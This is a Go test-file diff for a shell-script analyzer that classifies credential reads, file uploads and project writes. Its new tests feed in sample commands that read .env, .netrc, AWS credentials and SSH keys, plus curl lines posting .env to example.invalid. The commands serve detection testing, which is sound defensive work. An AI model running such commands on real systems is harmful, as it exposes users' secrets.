@@ -140,8 +140,8 @@ func TestClassifyPath(t *testing.T) {
 
 	tests := map[string]analysis.PathClass{
 		"/project/source":               analysis.PathProject,
-		"/home/workshop/.aws/config":    analysis.PathSensitive,
-		"/root/.ssh/id_ed25519":         analysis.PathSensitive,
+		"/home/workshop/.aws/config":    analysis.PathUserSensitive,
+		"/root/.ssh/id_ed25519":         analysis.PathUserSensitive,
 		"/var/lib/workshop/state/data":  analysis.PathState,
 		"/etc/systemd/system/x.service": analysis.PathPersistence,
 		"/dev/sda":                      analysis.PathDevice,
@@ -155,6 +155,98 @@ func TestClassifyPath(t *testing.T) {
 			t.Errorf("ClassifyPath(%q) = %q, want %q", path, got, want)
 		}
 	}
+}
+
+func TestSensitiveProjectFileReads(t *testing.T) {
+	t.Parallel()
+
+	result := analyze(t, "setup-project", `
+cat .env
+head .env.local
+tail secrets/deploy.pem
+grep token .npmrc
+sed -n 'p' .pypirc
+awk '{print}' .netrc
+source .aws/credentials
+. .config/gh/hosts.yml
+cat < .ssh/id_ed25519
+curl --data-binary @.env https://example.invalid/upload
+curl -F file=@.env https://example.invalid/upload
+cat .env.example .env.sample .env.template
+cat config/settings.json
+cat "$FILE"
+`)
+
+	projectReads := capabilitiesOfKind(result.Capabilities, "project-sensitive-file-read")
+	if len(projectReads) != 11 {
+		t.Fatalf("project sensitive reads = %d, want 11: %#v", len(projectReads), projectReads)
+	}
+	for _, capability := range projectReads {
+		if capability.Resolution != analysis.Resolved {
+			t.Errorf("resolution for %q = %q, want Resolved", capability.Target.Literal, capability.Resolution)
+		}
+		if capability.OperationID == "" {
+			t.Errorf("operation ID missing for %q", capability.Target.Literal)
+		}
+	}
+	for _, excluded := range []string{".env.example", ".env.sample", ".env.template"} {
+		if hasCapabilityTarget(projectReads, excluded) {
+			t.Errorf("template %q classified as project-sensitive", excluded)
+		}
+	}
+	if hasCapabilityTarget(projectReads, "config/settings.json") {
+		t.Error("ordinary project configuration was classified as project-sensitive")
+	}
+}
+
+func TestSensitivePathContextAndResolution(t *testing.T) {
+	t.Parallel()
+
+	base := analyze(t, "setup-base", `cat .env`)
+	if len(capabilitiesOfKind(base.Capabilities, "project-sensitive-file-read")) != 0 {
+		t.Error("relative path without a mounted project was classified as project-sensitive")
+	}
+	unknown := capabilitiesOfKind(base.Capabilities, "sensitive-file-read")
+	if len(unknown) != 1 || unknown[0].RuleID != "path.unknown-sensitive-candidate.read" {
+		t.Errorf("unknown sensitive candidates = %#v", unknown)
+	}
+	health := analyze(t, "check-health", `cat .env`)
+	if len(capabilitiesOfKind(health.Capabilities, "project-sensitive-file-read")) != 0 {
+		t.Error("relative check-health path was classified against /project instead of the SDK hook directory")
+	}
+	healthProject := analyze(t, "check-health", `cat /project/.env`)
+	if len(capabilitiesOfKind(healthProject.Capabilities, "project-sensitive-file-read")) != 1 {
+		t.Errorf("absolute check-health project read = %#v", healthProject.Capabilities)
+	}
+
+	project := analyze(t, "setup-project", `
+cat .env.*
+if test "$MODE" = secret; then file=.env; else file=config/settings.json; fi
+cat "$file"
+`)
+	partial := capabilitiesOfKind(project.Capabilities, "project-sensitive-file-read")
+	if len(partial) != 2 || partial[0].Resolution != analysis.PartiallyResolved || partial[1].Resolution != analysis.PartiallyResolved {
+		t.Errorf("partially resolved sensitive read = %#v", partial)
+	}
+}
+
+func capabilitiesOfKind(capabilities []analysis.Capability, kind string) []analysis.Capability {
+	var matches []analysis.Capability
+	for _, capability := range capabilities {
+		if capability.Kind == kind {
+			matches = append(matches, capability)
+		}
+	}
+	return matches
+}
+
+func hasCapabilityTarget(capabilities []analysis.Capability, target string) bool {
+	for _, capability := range capabilities {
+		if capability.Target.Literal == target {
+			return true
+		}
+	}
+	return false
 }
 
 func TestKnownCommandCoverage(t *testing.T) {
@@ -191,13 +283,14 @@ cat < /root/.ssh/id_ed25519
 tee /project/output
 `)
 	want := map[string]int{
-		"network-access|command.curl-network":      1,
-		"network-download|command.curl-download":   1,
-		"external-send|command.curl-upload":        1,
-		"code-execution|command.interpreter":       1,
-		"dynamic-execution|interpreter.shell-code": 1,
-		"credential-read|path.sensitive.read":      1,
-		"project-write|path.project.write":         1,
+		"network-access|command.curl-network":          1,
+		"network-download|command.curl-download":       1,
+		"external-send|command.curl-upload":            1,
+		"code-execution|command.interpreter":           1,
+		"dynamic-execution|interpreter.shell-code":     1,
+		"credential-read|path.user-sensitive.read":     1,
+		"sensitive-file-read|path.user-sensitive.read": 1,
+		"project-write|path.project.write":             1,
 	}
 	got := make(map[string]int)
 	for _, capability := range result.Capabilities {
@@ -206,8 +299,8 @@ tee /project/output
 			t.Errorf("rule source = %q", capability.RuleSource)
 		}
 	}
-	if len(result.Capabilities) != 7 {
-		t.Errorf("capability count = %d, want 7: %#v", len(result.Capabilities), got)
+	if len(result.Capabilities) != 8 {
+		t.Errorf("capability count = %d, want 8: %#v", len(result.Capabilities), got)
 	}
 	for key, count := range want {
 		if got[key] != count {
@@ -357,16 +450,16 @@ cp -t /project/out /root/.ssh/id_one /root/.ssh/id_two
 `)
 	counts := make(map[string]int)
 	for _, capability := range result.Capabilities {
-		counts[capability.RuleID]++
+		counts[capability.Kind+"|"+capability.RuleID]++
 	}
-	if counts["path.sensitive.read"] != 4 {
-		t.Errorf("sensitive reads = %d, want 4; all: %#v", counts["path.sensitive.read"], counts)
+	if counts["credential-read|path.user-sensitive.read"]+counts["credential-read|path.sensitive.read"] != 4 {
+		t.Errorf("credential reads = %d, want 4; all: %#v", counts["credential-read|path.user-sensitive.read"]+counts["credential-read|path.sensitive.read"], counts)
 	}
-	if counts["path.project.read"] != 4 {
-		t.Errorf("project reads = %d, want 4; all: %#v", counts["path.project.read"], counts)
+	if counts["project-read|path.project.read"] != 4 {
+		t.Errorf("project reads = %d, want 4; all: %#v", counts["project-read|path.project.read"], counts)
 	}
-	if counts["path.project.write"] != 2 {
-		t.Errorf("project writes = %d, want 2; all: %#v", counts["path.project.write"], counts)
+	if counts["project-write|path.project.write"] != 2 {
+		t.Errorf("project writes = %d, want 2; all: %#v", counts["project-write|path.project.write"], counts)
 	}
 }
 
@@ -381,16 +474,16 @@ touch -r /root/.ssh/id_ed25519 /project/output
 `)
 	counts := make(map[string]int)
 	for _, capability := range result.Capabilities {
-		counts[capability.RuleID]++
+		counts[capability.Kind+"|"+capability.RuleID]++
 	}
-	if counts["path.project.write"] != 1 {
-		t.Errorf("project writes = %d, want 1; all: %#v", counts["path.project.write"], counts)
+	if counts["project-write|path.project.write"] != 1 {
+		t.Errorf("project writes = %d, want 1; all: %#v", counts["project-write|path.project.write"], counts)
 	}
-	if counts["path.project.read"] != 0 {
+	if counts["project-read|path.project.read"] != 0 {
 		t.Errorf("unexpected project reads: %#v", counts)
 	}
-	if counts["path.sensitive.read"] != 1 {
-		t.Errorf("sensitive reads = %d, want 1; all: %#v", counts["path.sensitive.read"], counts)
+	if counts["credential-read|path.user-sensitive.read"] != 1 {
+		t.Errorf("credential reads = %d, want 1; all: %#v", counts["credential-read|path.user-sensitive.read"], counts)
 	}
 }
 
